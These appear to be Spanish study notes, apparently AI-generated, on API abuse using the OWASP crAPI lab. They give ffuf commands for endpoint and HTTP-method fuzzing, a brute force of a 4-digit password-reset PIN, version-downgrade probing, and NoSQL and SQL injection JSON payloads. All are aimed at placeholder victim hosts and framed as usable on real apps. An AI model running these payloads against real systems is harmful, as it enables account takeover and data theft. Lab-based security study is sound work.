## 📚 **Índice**

- [[#🔥 Introducción práctica: qué es API Abuse (versión hacker)]]
- [[#🐳 Despliegue real del laboratorio crAPI con Docker (2023 Fix)]]
- [[#📡 Enumeración real de APIs desde navegador → Postman]]
- [[#🚀 Postman como herramienta ofensiva]]
- [[#🛠 Variables globales, JWT y workspace estructurado]]
- [[#🔍 Enumeración ofensiva de endpoints con FFUF]]
- [[#🧪 Fuzzing de métodos HTTP (POST, PUT, DELETE, PATCH…)]]
- [[#🔐 Vectores reales de explotación (casos del mundo real)]]
- [[#💥 Escenario real: reset password con PIN débil (FUZZ)]]
- [[#⬇️ Downgrade de versión API (v3 → v2 → v1)]]
- [[#🗄 Abusos típicos: SQLi, NoSQLi, IDOR, CSRF vía API]]
- [[#🧰 Diccionarios útiles de SecLists]]
- [[#🎯 Checklist PRO antes de atacar una API]]
- [[#📎 Recursos (crAPI, PayloadAllTheThings, HackTricks)]]

---

# 🔥 **Introducción práctica: qué es API Abuse (versión hacker)**

API Abuse = **usar la API exactamente como fue diseñada… pero en contra del dueño**.  
No es teoría: **las apps modernas funcionan casi 100% por API**, así que si domina API Abuse, DOMINAS TODO.

Vectores reales que verás en vida real:

- Apps móviles mal hechas que exponen endpoints ocultos
    
- Reset password sin validar identidad → brute force
    
- Versiones viejas de la API aún activas
    
- Roles mal validados (cambiar email usando endpoint admin)
    
- Métodos HTTP incorrectamente permitidos
    
- Respuestas que filtran datos internos (debug info, IDs reales, etc.)
    

Todo lo que te dejo abajo es **aplicable 1:1** en crAPI, en apps reales, en móviles, etc.

---

# 🐳 **Despliegue real del laboratorio crAPI con Docker (Fix 24/05/2023)**

Muchos contenedores fallan → se usa branch **develop**.

```bash
curl -o docker-compose.yml \
https://raw.githubusercontent.com/OWASP/crAPI/develop/deploy/docker/docker-compose.yml

VERSION=develop docker-compose pull
VERSION=develop docker-compose -f docker-compose.yml --compatibility up -d
```

Si contenedores fallan:

```bash
docker rm $(docker ps -a -q) --force
VERSION=develop docker-compose -f docker-compose.yml --compatibility up -d
```

**Reintenta varias veces**, a veces Docker tarda en liberar procesos.

---

# 📡 **Enumeración real de APIs desde navegador → Postman**

Empezamos como atacante REAL:

1. Abres la web objetivo.
    
2. **DevTools → Network**.
    
3. Filtras por:
    
    - **Fetch/XHR**
        
    - **GraphQL**
        
    - **WS** si hay websockets
        
4. Observas:
    
    - Endpoint
        
    - Método
        
    - Payload (JSON, form, multipart)
        
    - Headers (JWT, cookies, tokens)
        
    - Response codes
        
    - Error messages
        

👉 Copias **la request exacta** → _Copy → Copy as cURL_.

Eso te da una prueba perfecta de cómo la API espera los datos.

---

# 🚀 **Postman como herramienta ofensiva**

En Postman → **New Collection → New HTTP Request**.

Pegas el endpoint:  
Ej:

```
POST https://api.victima.com/v3/account/reset
```

Seteas:

- **Headers** (Content-Type, Authorization, etc.)
    
- **Body → raw → JSON**  
    Pegas exactamente el payload del navegador:
    

```json
{
  "email": "victima@gmail.com",
  "pin_code": "1234"
}
```

Postman te da:

- Historial
    
- Repetición exacta del ataque
    
- Manipulación completa del request
    
- Automatización (scripts)
    

### Vector real: reproducir requests de app móvil

Muchas apps móviles envían requests con:

- Device-ID
    
- Version-App
    
- Internal flags
    
- Rol del usuario
    
- Parámetros ocultos
    

Postman te permite **modificarlos a voluntad**.

---

# 🛠 **Variables globales, JWT y workspace estructurado**

Una API real siempre tiene **autenticación**.

Flujo:

1. Haces **login** con Postman.
    
2. Recibes un **JWT**.
    
3. Creas en tu Collection → **Variables**:
    
    - token
        
    - api_url
        
    - user_id
        

Ejemplo variable:

```
{{jwt}}
```

En Authorization:

- Type: **Bearer Token**
    
- Token: `{{jwt}}`
    

Postman reemplaza automáticamente.

Esto te permite enumerar **todos los endpoints** como un atacante autenticado.

---

# 🔍 **Enumeración ofensiva de endpoints con FFUF**

Una vez tienes la estructura base, empiezas atacando:

### **1️⃣ Descubrimiento de endpoints**

```
ffuf -u https://api.objetivo.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
```

### **2️⃣ Enumeración dentro de rutas existentes**

```
ffuf -u https://api.objetivo.com/account/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### **3️⃣ Fuzzing de parámetros**

```
ffuf -u https://api.objetivo.com/reset?code=FUZZ \
-w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt
```

---

# 🧪 **Fuzzing de métodos HTTP (POST, PUT, DELETE, PATCH…)**

Un error MUY común en APIs reales es permitir métodos peligrosos:

```
ffuf -X FUZZ -u https://api.objetivo.com/user/100 \
-w /usr/share/seclists/Discovery/Web-Content/api/http-methods.txt
```

Si responde **200 OK** a un método que no debería:

- **DELETE** → borrar cuentas
    
- **PUT** → modificar recursos
    
- **PATCH** → alterar configuraciones
    
- **POST** → insertar datos no autorizados
    

Esto pasa EN LA VIDA REAL. Mucho.

---

# 🔐 **Vectores reales de explotación (casos del mundo real)**

### 🔥 1. **IDOR vía API**

Escenarios reales:

```
GET /api/user/123
GET /api/user/124
```

Si puedes leer otros usuarios → **Data Leak**.

Si puedes modificar → **Account Takeover**.

---

### 🔥 2. **NoSQL Injection vía API**

Casos típicos:

```json
{
  "email": {"$ne": null},
  "password": {"$ne": null}
}
```

---

### 🔥 3. **SQL Injection en parámetros JSON**

Si backend no valida:

```json
{
  "email": "victima@gmail.com' OR 1=1 -- "
}
```

---

### 🔥 4. **CSRF-like abuse en APIs sin tokens**

Si no validan origen → puedes usar la API desde cualquier dominio.

---

### 🔥 5. **Debug data Leak**

Muchas APIs exponen:

- rutas internas
    
- stacktraces
    
- IDs reales
    
- flags de entorno
    

Todo se arma para explotación posterior.

---

# 💥 **Escenario real: reset password con PIN débil (FUZZ)**

Ejemplo súper real (pasa diario):

API pide:

```json
{
  "email": "victima@gmail.com",
  "pin": "1234"
}
```

Pero **no pide la contraseña actual**.

Plan de ataque:

1. Intento con Postman para ver cómo responde.
    
2. Monto FFUF:
    

```
ffuf -u https://api.objetivo.com/v3/reset \
-X POST \
-H "Content-Type: application/json" \
-d '{"email":"victima@gmail.com","pin":"FUZZ"}' \
-w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt
```

Si la API tiene rate limit malo → pin brute forced.

---

# ⬇️ **Downgrade de versión API (v3 → v2 → v1)**

Esto lo viste tú mismo:

- v3 tenía rate limit
    
- v2 NO
    
- v1 todavía activa
    

Muchísimas APIs dejan **versiones viejas abiertas**.

Ejemplo:

```
/api/v3/reset  → 429  
/api/v2/reset  → 200  
/api/v1/reset  → vulnerable a SQLi
```

Combinas eso con FFUF:

```
ffuf -u https://api.objetivo.com/api/FUZZ/reset \
-w versions.txt
```

---

# 🗄 **Abusos típicos: SQLi, NoSQLi, IDOR, CSRF vía API**

La API es la superficie perfecta para:

### SQLi → Via JSON

### NoSQLi → Via operadores

### IDOR → Cambiar IDs en URL

### CSRF → Si no validan origen

### Broken Auth → JWT mal firmados

### Exposición de data → Responses verbose

---

# 🧰 **Diccionarios útiles de SecLists**

- `/usr/share/seclists/Fuzzing/4-digits-0000-9999.txt`
    
- `/usr/share/seclists/Discovery/Web-Content/api/objects.txt`
    
- `/usr/share/seclists/Discovery/Web-Content/common.txt`
    
- `/usr/share/seclists/Discovery/Web-Content/api/http-methods.txt`
    

---

# 🎯 **Checklist PRO antes de atacar una API**

✔ Enumerar con Network (browser)  
✔ Reproducir en Postman  
✔ Crear variables de JWT  
✔ Enumerar entidades con FFUF  
✔ Fuzzear métodos HTTP  
✔ Probar version downgrade  
✔ Buscar IDOR  
✔ Buscar credenciales expuestas  
✔ Probar brute-force PIN  
✔ Validar rate-limit  
✔ Revisar filtraciones en responses

---

# 📎 **Recursos**

- **crAPI**  
    [https://github.com/OWASP/crAPI](https://github.com/OWASP/crAPI)
    
- **PayloadAllTheThings (APIs)**  
    [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
    
- **HackTricks (API Pentesting)**  
    [https://book.hacktricks.wiki](https://book.hacktricks.wiki/)
    
- **SecLists**  
    `/usr/share/seclists/`
    

---

Si quieres, te genero:

✅ Un **workflow ofensivo completo** para APIs en Obsidian  
o  
✅ Un **script en Bash** que automatice enumeración + FFUF + Postman

¿Qué prefieres?